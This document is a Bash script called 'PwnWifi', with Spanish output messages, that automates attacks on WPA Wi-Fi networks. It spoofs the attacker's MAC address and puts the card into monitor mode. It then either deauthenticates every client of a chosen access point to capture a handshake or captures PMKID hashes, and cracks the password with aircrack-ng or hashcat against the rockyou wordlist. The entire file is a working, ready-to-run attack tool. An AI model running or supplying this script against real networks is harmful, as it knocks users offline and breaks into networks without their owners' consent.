#!/bin/bash

# Author: @FN8
figlet "FN8"
echo "Redes Sociales:"
echo "https://www.youtube.com/@FN8_"
echo "https://www.instagram.com/fn8___/"
sleep 2

#Colours
green="\e[0;32m\033[1m"
end="\033[0m\e[0m"
red="\e[0;31m\033[1m"
blue="\e[0;34m\033[1m"
yellow="\e[0;33m\033[1m"
purple="\e[0;35m\033[1m"
turquoise="\e[0;36m\033[1m"
gray="\e[0;37m\033[1m"

function ctrl_c(){
	echo -e "\n${yellow}[*]${end}${gray}Saliendo...${end}"
	tput cnorm; airmon-ng stop $networkCard > /dev/null 2>&1
	exit 1
}

trap ctrl_c INT

function helpPanel(){
	echo -e "\n${yellow}[*]${end}${gray} Uso: ./PwnWifi${end}\n"
	echo -e "\t${gray}-a)${end} ${purple}Modo de Ataque${end}"
	echo -e "\t\t${red}Handshake${end}"
	echo -e "\t\t${red}PKMID${end}"
	echo -e "\t${gray}-n)${end}${purple} Nombre de la tarjeta de red${end}"
	echo -e "\t${gray}-h)${end}${purple} Panel de Ayuda${end}"
}

export DEBIAN_FRONTEND=noninteractive

function dependencies(){
	tput civis

	clear; dependencies=(aircrack-ng macchanger)

	echo -e "${yellow}[+] ${end}${gray}Comprobando programas necesarios${end}"
	sleep 2

	for program in "${dependencies[@]}"; do
		echo -ne "\n${yellow}[*] ${end}${gray}Herramienta${end}${purple} $program${end}${blue}...${end}"

		test -f /usr/bin/$program

		if [ "$(echo $?)" == "0" ]; then
			echo -e "${green} (V)${end}"
		else
			echo -e "${red} (X)${end}\n"
			echo -e "${yellow}[+]${end} ${gray}Instalando herramienta${end}${purple} $program${end}${blue}...${end}"
			apt-get install $program -y > /dev/null 2>&1
			echo -e "\n${yellow}[*]${end}${gray} Herramienta descargada con Exito${end}${green}!${end}\n"; sleep 1
			echo -ne "\n${gray}Ruta del Programa${end}${green}:${end} ${blue}--> ${end}"; echo -e "$(which $program)"
		fi; sleep 1
	done

}

function startAttack(){
	airmon-ng check kill > /dev/null 2>&1
 	clear
    echo -e "\n${yellow}[+]${end} ${gray}Configurando tarjeta en modo monitor${end}${blue}...${end}"
    airmon-ng start $networkCard > /dev/null 2>&1
    ifconfig $networkCard down && macchanger -a $networkCard > /dev/null 2>&1
    ifconfig $networkCard up; killall dhclient wpa_supplicant 2>/dev/null # matamos los procesos complictivos
    echo -e "\n${yellow}[*]${end} ${gray}Nueva direccion MAC asignada${end} ${purple}(${end}${blue}$(macchanger -s $networkCard | grep "Current" | xargs | cut -d ' ' -f '3-100')${end}${purple})${end}" 

	if [ "$(echo $attack_mode)" == "Handshake" ]; then

		xterm -hold -e "airodump-ng $networkCard" &
		airodump_xterm_PID=$! # nombramos el PID del proceso
		echo -ne "\n${yellow}[*]${end}${gray} Nombre del punto de Acceso: ${end}" && read apName # El input del usuario lo vamos almacenar en la variable apName
		echo -ne "\n${yellow}[*]${end}${gray} Canal del punto de Acceso: ${end}" && read  apChannel

		kill -9 $airodump_xterm_PID # Matamos el proceso
		wait $airodump_xterm_PID 2>/dev/null

		xterm -hold -e "airodump-ng -c $apChannel -w captura --essid $apName $networkCard" &
		airodump_filter_xterm_PID=$!

		sleep 5; xterm -hold -e "aireplay-ng -0 0 -e $apName -c FF:FF:FF:FF:FF:FF $networkCard" &
		aireplay_xterm_PID=$!
		sleep 10; kill -9 $aireplay_xterm_PID
		wait $aireplay_xterm_PID 2>/dev/null

		sleep 10; kill -9 $airodump_filter_xterm_PID
		wait $airodump_filter_xterm_PID 2>/dev/null

		xterm -hold -e "aircrack-ng -w /usr/share/wordlists/rockyou.txt captura-01.cap" &

	elif [ "$(echo $attack_mode)" == "PKMID" ]; then
		clear
		echo -e "\n${yellow}[*]${end}${gray} Iniciando ClientLess PKMID Attack...${end}\n"
		sleep 2
		timeout 60 bash -c "hcxdumptool -i ${networkCard} --enable_status=1 -o Captura"
		echo -e "\n${yellow}[+]${end} ${gray} Obteniendo Hashes... ${end}\n"
		sleep 2
		hcxpcaptool -z myHashes Captura; rm Captura 2>/dev/null

		echo -e "\n${gray} Iniciando proceso de FUerza Bruta con HashCat...${end}\n"
		hashcat -m 16800 /usr/share/wordlists/rockyou.txt myHashes -d 1 --force
	else
		echo -e "\n${red}[*] Este mode de ataque no es valido ${end}\n"
	fi
}

# Main Function

if [ "$(id -u)" == "0" ]; then
	declare -i parameter_counter=0; while getopts ":a:n:h:" arg; do
		case $arg in
			a) attack_mode=$OPTARG; let parameter_counter+=1 ;;
			n) networkCard=$OPTARG; let parameter_counter+=1 ;;
			h) helpPanel;;
		esac

	done

	if [ $parameter_counter -ne 2 ]; then
		helpPanel
	else
		dependencies
		startAttack
		tput cnorm; airmon-ng stop $networkCard > /dev/null 2>&1
	fi

else
	echo -e "\n${red}[-] Lo sentimos, no eres root no puedes ejecutar este Script${end}\n"
fi
